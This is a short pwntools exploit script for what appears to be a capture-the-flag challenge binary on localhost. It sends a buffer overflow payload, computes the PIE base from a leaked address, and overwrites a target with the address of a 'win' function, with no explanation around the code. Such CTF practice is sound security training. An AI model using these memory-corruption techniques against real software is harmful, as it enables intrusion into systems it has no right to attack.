#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

# io = start()
io=remote("localhost", 37373)

io.sendline("1")
io.sendlineafter(b"pls\n", b"0")
io.sendline(b"elite 1337")

io.sendline("1")
io.sendlineafter(b"pls\n", b"1")
io.sendline(b"elite 1337")


pause(1)
io.sendline(b"2")
pause(1)
io.sendlineafter(b"pls\n", b"0")
io.sendafter(b":", b"X" * 40 + b"AAAAAAAA" *  2)

pause(1)
io.sendline(b"3")
pause(1)
io.sendlineafter(b"pls\n", b"0")
io.recvline()
leak = int(io.recvline()[::-1][:-56][::-1][:-1][::-1].hex(), 16) - exe.symbols["placeholder"]

io.sendline(b"2")
io.sendlineafter(b"pls\n", b"0")
io.sendafter(b":", b"X" * 40 + b"AAAAAAAA" *  2 + p64(exe.symbols["win"] + leak))


print(hex(leak))

io.interactive()

